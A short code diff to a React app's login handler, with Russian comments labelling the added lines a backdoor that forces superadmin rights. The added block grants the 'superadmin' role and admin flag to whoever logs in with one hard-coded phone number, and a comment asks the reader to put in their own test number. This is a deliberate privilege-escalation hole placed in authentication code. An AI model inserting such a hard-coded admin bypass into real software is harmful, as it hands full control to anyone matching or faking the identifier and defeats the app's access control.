@@ -2589,6 +2589,13 @@ export default function App() {
   };
 
   const handleLogin = (user) => {
+      // --- БЭКДОР: Принудительно выдаем права Суперадмина ---
+      // Впиши сюда свой реальный номер телефона, с которого тестируешь
+      if (user.phone === '+7 (999) 000-00-00') {
+          user.role = 'superadmin';
+          user.isAdmin = true;
+      }
+      
       setCurrentUser(user);
       setIsAuthModalOpen(false);
   };
